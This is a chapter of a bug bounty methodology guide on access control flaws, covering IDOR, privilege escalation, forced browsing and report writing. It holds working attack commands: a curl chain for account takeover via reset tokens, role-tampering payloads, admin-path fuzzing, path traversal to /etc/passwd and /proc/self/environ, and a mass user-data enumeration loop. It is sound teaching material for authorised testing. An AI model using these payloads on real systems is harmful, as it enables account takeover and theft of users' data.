---
icon: lucide/user-lock
tags:
  - idor
  - access-control
  - privilege-escalation
  - bug-bounty
description: The single most common high-severity vulnerability class in bug bounty. Cannot be found by a scanner. Requires a human who understands what the app is supposed to restrict — and then tests whether it actually does.
---

# Access Control

Access control is the single most common high-severity vulnerability class in bug bounty. IDOR alone accounts for a disproportionate share of Critical and High payouts. The reason it stays so common: it cannot be found by a scanner. It requires a human who understands what the application is supposed to restrict, and then tests whether it actually does.

Every object the application manages is a potential IDOR. Every role boundary is a potential privilege escalation.

---

<div class="grid cards" markdown>

-   :material-identifier:{ .lg .middle } __3.1 IDOR Fundamentals__

    ---

    Reference types, where they live, the two-account methodology, UUID misconceptions.

    [:octicons-arrow-right-24: Start here](#31-idor-fundamentals)

-   :material-magnify-scan:{ .lg .middle } __3.2 Finding IDORs at Scale__

    ---

    Autorize setup, manual flow mapping, chaining reads into ATO.

    [:octicons-arrow-right-24: Scale](#32-finding-idors-at-scale)

-   :material-arrow-up-bold:{ .lg .middle } __3.3 Vertical Privilege Escalation__

    ---

    Role tampering, admin endpoint access, forced browsing, state bypass.

    [:octicons-arrow-right-24: Privesc](#33-vertical-privilege-escalation)

-   :material-link-variant:{ .lg .middle } __3.4 Indirect Object References__

    ---

    Email and username as references, filename traversal as IDOR variant.

    [:octicons-arrow-right-24: Indirect](#34-indirect-object-references)

-   :material-alert-decagram:{ .lg .middle } __3.5 Impact Escalation__

    ---

    Severity framework, mass IDOR, writing reports that get paid.

    [:octicons-arrow-right-24: Impact](#35-idor-impact-escalation)

</div>

---

## Decision Flow

```
App has user-owned objects (invoices, files, messages, profiles)?
→ IDOR first. Set up two accounts before anything else.

App has multiple user roles (free/paid, user/admin, member/owner)?
→ Vertical privesc. Test role parameter tampering + admin endpoint access.

Found numeric IDs in URLs or request bodies?
→ Increment/decrement. Test from second account session.

Found UUIDs or hashed IDs?
→ Don't assume they're safe. Find them in other API responses first. (3.1.4)

Found a multi-step flow (checkout, onboarding, verification)?
→ Test whether steps can be skipped entirely. (3.3.3)

Time-constrained?
→ Autorize running + browse full app as two accounts → triage flags manually
```

---

## 3.1 IDOR Fundamentals

**What IDOR is:** Insecure Direct Object Reference — when an application exposes a reference to an internal object (database record, file, user account) and doesn't verify that the requesting user is authorized to access that specific object.

The attacker changes the reference. The server returns someone else's data.

### 3.1.1 Object Reference Types

Not all references look like integers. Know every form they take:

| Reference Type | Example | Notes |
|---|---|---|
| Numeric ID | `/api/invoice/1042` | Most obvious, still common |
| UUID/GUID | `/api/doc/550e8400-e29b-41d4-a716` | Not a security control — see 3.1.4 |
| Hash (MD5/SHA1) | `/files/5f4dcc3b5aa765d61d8327deb` | Not a security control — see 3.1.4 |
| Username | `/profile/john.doe` | Swap username in URL |
| Email | `/api/user?email=victim@x.com` | Direct enumeration |
| Filename | `/download?file=report_1042.pdf` | Path traversal also possible |
| Encoded value | `/api/obj/dXNlcl8xMDQy` | Base64 — decode first |
| Indirect slug | `/api/invoice/march-2026` | Predictable from pattern |

```bash title="decode_references.sh"
# Base64 — often just an encoded integer
echo "dXNlcl8xMDQy" | base64 -d
# user_1042 → numeric ID was just encoded

# URL encoded
python3 -c "import urllib.parse; print(urllib.parse.unquote('user%5F1042'))"

# JWT payload (frequently contains object references)
echo "<payload_part>" | base64 -d
```

---

### 3.1.2 Where IDORs Live

The key question for every parameter: *Does changing this value to another user's equivalent give me access to their data or actions?*

```
URL path parameters:
  GET /api/users/1042/profile
  GET /documents/download/5523
  GET /invoices/march-2026/export

Query string parameters:
  GET /dashboard?user_id=1042
  GET /report?account=5523&format=pdf
  GET /notifications?recipient=john.doe

Request body (POST/PUT/PATCH):
  {"user_id": 1042, "action": "delete"}
  {"document_id": "550e8400...", "share": true}
  {"account_number": "5523", "amount": 100}

HTTP headers:
  X-User-ID: 1042
  X-Account-ID: 5523
  X-Org-ID: 99

Cookies:
  user_id=1042
  account=5523

Indirect — referenced in response, sent back in next request:
  Step 1: GET /cart → response contains {"cart_id": "abc123"}
  Step 2: POST /checkout {"cart_id": "abc123"} ← swap this
```

---

### 3.1.3 The Two-Account Testing Methodology

**This is the correct way to test IDOR. Always use two accounts.**

```
Account A — attacker (you control this)
Account B — victim  (you also control this — second test account)

Setup:
1. Log in as Account B, create objects: upload a file, create a document,
   place an order, send a message. Note all object IDs.
2. Log in as Account A.
3. Attempt to access Account B's objects using Account A's session.
4. Account A can access Account B's data → IDOR confirmed.

Why two accounts:
- You always have a valid ID to test with (Account B's real IDs)
- You can confirm exactly what data was accessed
- You can demonstrate impact clearly in the report
- No risk of accidentally accessing real user data
```

**Autorize workflow in Burp:**

```
1. Install Autorize (BApp Store)
2. Log in as Account A (low privilege) → copy session cookie to Autorize
3. Log in as Account B (same or higher privilege)
4. Browse the app as Account B — Autorize replays every request
   automatically using Account A's session
5. Autorize flags requests where Account A gets a 200 with similar
   response body to Account B → IDOR candidate
6. Manually verify every flag
```

**Autorize result states:**

| State | Meaning |
|---|---|
| `Bypassed!` | Same response body — verify manually |
| `Enforced!` | Different response (smaller body, 403) — not vulnerable |
| `Is enforced???` | Ambiguous — review manually |

!!! tip "Autorize configuration"
    Set "Ignore headers" for: `Cookie`, `Authorization`, `X-CSRF-Token` — so only those get swapped. Add a "Filtered strings" pattern for your own Account A data so it doesn't false-positive on your own objects.

---

### 3.1.4 UUID and Hash-Based IDOR

**The misconception:** Many developers believe UUIDs and hashed IDs are security controls. They are not. They are obscurity. If the UUID or hash is discoverable through any other means, the IDOR is fully exploitable.

**How to find other users' UUIDs:**

```bash title="uuid_discovery.sh"
# 1. API responses that list other users' UUIDs
# GET /api/org/members → [{user_id: "550e8400...", name: "Alice"}, ...]
# Now test: GET /api/users/550e8400.../private-data

# 2. Error messages that reveal IDs
# "Access denied to document 550e8400-e29b-41d4-a716"
# → UUID is now known — test from another account

# 3. UUID v1 is time-based and sequential — predictable
# Check: if IDs look like 550e8400-e29b-11e?-... → UUIDv1

# 4. Hash-based IDs from predictable input
# /files/5f4dcc3b5aa765d61d8327deb882cf99
# → MD5 of "password"? Test:
echo -n "report_2026.pdf" | md5sum

# 5. Grep all Burp responses for UUIDs
grep -rE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" \
  burp_responses/ | sort -u
```

---

## 3.2 Finding IDORs at Scale

### 3.2.1 Manual Flow Mapping

**When to use:** After Autorize. Autorize catches horizontal IDORs but misses vertical escalation, state-based access, and indirect IDORs that span multiple steps.

Build this table for every application feature you test:

| Feature | Object | Reference Location | Tested |
|---|---|---|---|
| View invoice | `invoice_id` | `GET /api/invoice/ID` | ✓ |
| Delete document | `doc_id` | POST body | ✓ |
| Export report | `account_id` | Query param | ✓ |
| Share file | `file_uuid` | Request body | ✓ |
| View audit log | `org_id` | Header | ✓ |

For each row ask: **What object does this operate on? Who is supposed to have access? What happens if I change the reference?**

---

### 3.2.2 Chaining IDORs into Account Takeover

A read IDOR on a user's email is not just information disclosure — it's the first step in an ATO chain. Always ask: *What's the worst thing I can do with this IDOR?*

| IDOR Chain | Steps | Result |
|---|---|---|
| Read IDOR on email | Get victim email → trigger password reset | ATO |
| Read IDOR on reset token | `GET /api/users/1043/reset-token` → use token | ATO |
| Read IDOR on MFA backup codes | Get codes → bypass MFA | ATO |
| Write IDOR on email field | Change victim email to attacker email → reset | ATO |

```bash title="idor_chain_example.sh"
# Step 1: Read IDOR — get victim's email
curl -H "Cookie: session=<attacker>" https://target.com/api/users/1043
# Returns: {"email": "victim@target.com", ...}

# Step 2: Trigger password reset for victim's email
curl -X POST https://target.com/forgot-password \
  -d "email=victim@target.com"

# Step 3: If reset token also IDOR-able:
curl -H "Cookie: session=<attacker>" https://target.com/api/users/1043/reset-token
# Returns: {"token": "abc123"}

# Step 4: Reset victim's password
curl -X POST https://target.com/reset-password \
  -d "token=abc123&password=attacker_controlled"
# Full ATO — report as Critical
```

---

## 3.3 Vertical Privilege Escalation

A lower-privileged user performing actions or accessing data reserved for higher-privileged users: user → admin, user → moderator, free → premium.

### 3.3.1 Role Parameter Tampering

**When to use:** On any registration, profile update, or account settings endpoint. Look for role-like fields in the request body.

```bash title="role_tampering.sh"
# Registration with role param
POST /api/register
{"username": "attacker", "email": "x@x.com", "password": "x", "role": "user"}
#                                                                  ↑ try "admin"

# Profile update
PUT /api/users/me
{"email": "x@x.com", "role": "user"}
#                      ↑ try "admin", "moderator", "staff"

# Mass assignment — add undocumented fields to any PUT/PATCH
PUT /api/profile {"display_name": "John"}
# Try:
PUT /api/profile {"display_name": "John", "role": "admin", "is_admin": true, "plan": "enterprise"}
```

!!! tip "Mass assignment"
    Param Miner (BApp) discovers hidden parameters automatically. Also fuzz with SecLists `burp-parameter-names.txt` via Intruder — add each discovered param to the request body and watch for behavioral changes.

---

### 3.3.2 Admin Endpoint Access as Regular User

**When to use:** After httpx triage and recon. The UI hides admin links — the server may not enforce access control on the underlying routes.

```bash title="admin_endpoint_fuzz.sh"
# Fuzz for admin paths with regular user session
ffuf -u https://target.com/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
  -H "Cookie: session=<regular_user_session>" \
  -mc 200,201,301,302 \
  -o admin_endpoints.txt

# API-specific
ffuf -u https://target.com/api/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/api-endpoints.txt \
  -H "Authorization: Bearer <regular_user_token>" \
  -mc 200,201,400  # 400 = endpoint exists but bad request format
```

**Admin paths frequently missed:**

```
/admin             /administrator      /admin/panel
/api/admin/users   /api/admin/config   /api/admin/stats
/api/v1/admin/*    /api/internal/*
/management        /manage             /console
/staff             /superuser
/_admin            /_internal          /_debug
/api/users?admin=true
```

**HTTP method swap on 403'd endpoints:**

```bash title="method_swap.sh"
BASE="https://target.com/admin/users/delete/1042"
COOKIE="Cookie: session=<regular_user>"

# If GET returns 403, try:
curl -X POST   "$BASE" -H "$COOKIE"
curl -X PUT    "$BASE" -H "$COOKIE"
curl -X DELETE "$BASE" -H "$COOKIE"
curl -X PATCH  "$BASE" -H "$COOKIE"
# Different method → different code path → potentially different access check
```

---

### 3.3.3 Forced Browsing and State Bypass

**When to use:** On any multi-step process — onboarding, checkout, identity verification, email confirmation.

Some steps only check that the previous step was *visited*, not that it was completed successfully.

```
Normal checkout flow:
  /checkout/step1 (cart) → /checkout/step2 (payment) → /checkout/step3 (confirm)

Attack:
  Skip step2 (payment) → navigate directly to /checkout/step3
  → Does the order complete without payment?

Verification bypass:
  POST /api/verify-phone {"code": "123456"} → fails
  Navigate directly to /dashboard
  → Does the app require verified phone, or just that the step was visited?

Email confirmation bypass:
  /verify-email → /set-password → /complete-profile → /dashboard
  → Skip directly to /dashboard without confirming email
  → Does the app grant access with unverified email?
```

!!! warning "These are often business logic bugs, not just access control"
    Skipping a payment step is a Critical business logic finding regardless of whether it also constitutes an access control failure. Report the most impactful framing.

---

## 3.4 Indirect Object References

### 3.4.1 Email and Username as References

**These are IDORs too — just less obvious.**

```bash title="indirect_reference_tests.sh"
# Password reset with email parameter
POST /api/password-reset {"email": "attacker@x.com"}   # normal
POST /api/password-reset {"email": "victim@target.com"} # sends reset to victim

# Notification/unsubscribe via email
GET /api/unsubscribe?email=attacker@x.com    # your own
GET /api/unsubscribe?email=victim@target.com # disrupts victim's account

# Profile lookup via username
GET /api/profile?username=attacker  # your profile
GET /api/profile?username=admin     # admin's profile data

# Messaging — can you send as another user?
POST /api/message {"to": "john.doe", "from": "attacker"}
# Try changing "from" to another user's handle
```

---

### 3.4.2 Filename as Reference (Path Traversal Variant)

**When to use:** On any file download, export, or template endpoint where a filename is passed in the request.

```bash title="filename_traversal.sh"
# Base request
GET /api/files/download?name=myreport.pdf

# Path traversal attempts
GET /api/files/download?name=../myreport.pdf
GET /api/files/download?name=../../etc/passwd
GET /api/files/download?name=../users/admin/private.pdf
GET /api/files/download?name=..%2Fusers%2Fadmin%2Fprivate.pdf

# Template injection variant
POST /api/export {"template": "invoice.html"}
POST /api/export {"template": "../../../etc/passwd"}
POST /api/export {"template": "../../../../proc/self/environ"}
```

!!! info "See also"
    Section 5.4 (Local File Inclusion / Path Traversal) covers this attack class in full depth, including filter bypass techniques and useful file targets.

---

## 3.5 IDOR Impact Escalation

### 3.5.1 Severity Framework

The severity of an IDOR is determined by what it exposes or enables — not by the fact that it exists.

| IDOR Type | Example Impact | Typical Severity |
|---|---|---|
| Read — public data | Other user's display name | Informational / Low |
| Read — PII | Email, phone, address, DOB | Medium – High |
| Read — sensitive data | Payment cards, SSN, medical records | High – Critical |
| Read — credentials/tokens | Password reset token, API key | Critical |
| Write — own data modified | Change your own plan or role | Medium |
| Write — other user's data | Change victim's email or password | High – Critical |
| Delete — other user's objects | Delete victim's files or account | High |
| Action — on behalf of user | Post as victim, transfer funds | Critical |

**Mass IDOR — when one bug affects every user:**

```bash title="mass_idor_probe.sh"
# Test sequential IDs across a range
for id in $(seq 1 100); do
  code=$(curl -sk -o /tmp/resp.txt -w "%{http_code}" \
    -H "Cookie: session=<attacker>" \
    "https://target.com/api/users/$id/export")
  [ "$code" = "200" ] && echo "$id: $(cat /tmp/resp.txt | jq -r '.email')"
done
# If all 100 return different users' PII → mass data exposure
# Report as Critical: "Full user database enumerable via IDOR"
# Include estimated user count in impact statement
```

---

### 3.5.2 Writing the IDOR Report

The difference between a paid IDOR report and a rejected one is almost always the impact statement and reproduction steps.

**Title formula:**

```
IDOR in [feature/endpoint] allows [actor] to [impact] via [parameter]

Examples:
"IDOR in /api/invoices/{id} allows any authenticated user to read
 other users' invoices via numeric ID manipulation"

"IDOR in document export endpoint allows account takeover via
 predictable document_id parameter"
```

**Write the impact statement first:**

```
An authenticated attacker with a free account can enumerate all user invoices
by incrementing the invoice_id parameter. Each invoice contains full billing
information including name, address, and last 4 digits of payment card.
With approximately 50,000 users, this exposes PII for the entire user base.
```

**Reproduction steps — write for a developer with no security knowledge:**

```
1. Create two accounts: Account A (attacker) and Account B (victim)
2. Log in as Account B, create an invoice. Note the ID in the URL: /invoice/5523
3. Log in as Account A
4. Send the following request:

   GET /api/invoice/5523 HTTP/1.1
   Host: target.com
   Cookie: session=<Account_A_session>

5. Observe: the full invoice is returned, including Account B's billing
   information, despite Account A having no relationship to Account B.
```

**Evidence:**

- Raw HTTP request and response (victim's data highlighted or annotated)
- Screenshot or screen recording — video dramatically increases acceptance rate
- For mass IDOR: show a range of IDs returning different users' data

**Suggested fix:**

```
Implement server-side ownership verification before returning any object.
Verify that the requesting user's ID matches the owner_id field of the
requested resource. Do not rely on ID obscurity.
```

!!! tip "See also"
    Part 11 (Reporting Mastery) covers full report templates and severity calibration in depth.

---

## Part 3 Complete Checklist

??? note "Expand full checklist"

    ```
    IDOR — HORIZONTAL (same privilege, different user)
    □ Every numeric ID in URL paths — increment/decrement
    □ Every ID in request body parameters
    □ Every ID in query string parameters
    □ Every ID in custom headers (X-User-ID, X-Account-ID)
    □ Cookie values containing IDs or references
    □ UUIDs in responses — are they used in subsequent requests?
    □ Hash-based IDs — predictable from known input?
    □ Encoded values (base64, URL-encoded) — decode and analyze
    □ Autorize running during full manual app walkthrough
    □ Two-account methodology: Account B's IDs tested from Account A

    IDOR — WRITE OPERATIONS (higher impact)
    □ PUT/PATCH/DELETE on object IDs — can you modify/delete others' objects?
    □ Action endpoints: /share, /transfer, /export, /delete with ID params
    □ File operations: download?file=, template=, export?document=

    IDOR → ATO CHAINS
    □ Read IDOR on email/phone → trigger password reset → ATO
    □ Read IDOR on reset token → use token → ATO
    □ Write IDOR on email field → change to attacker email → reset → ATO
    □ Read IDOR on MFA codes → bypass MFA

    VERTICAL PRIVILEGE ESCALATION
    □ Role/admin parameters in registration or profile update
    □ Mass assignment: add role/admin/plan fields to any PUT/PATCH
    □ Admin endpoints accessible with regular session (ffuf + auth cookie)
    □ HTTP method swap on 403'd admin endpoints
    □ Multi-step flow: can steps be skipped? Step 2 reachable without step 1?

    INDIRECT REFERENCES
    □ Email as object reference — change email param to victim's
    □ Username as object reference
    □ Filename as reference — path traversal variant
    □ Slug/readable ID — predictable from naming pattern

    IMPACT ASSESSMENT
    □ What is the worst action possible with this IDOR?
    □ Is this mass-exploitable (sequential IDs, all users affected)?
    □ Does it expose PII, credentials, payment data, or enable ATO?
    □ Is the write version also vulnerable, not just read?
    ```

---

## References

<div class="grid cards" markdown>

-   :simple-portswigger: __PortSwigger Labs__

    ---

    - [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
    - [IDOR](https://portswigger.net/web-security/access-control/idor)

-   :octicons-tools-16: __Tools__

    ---

    - [Autorize (BApp Store)](https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f)
    - [Param Miner (BApp Store)](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)

-   :octicons-book-16: __References__

    ---

    - [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
    - [PayloadsAllTheThings — IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)
    - [HackTricks — IDOR](https://book.hacktricks.xyz/pentesting-web/idor)

</div>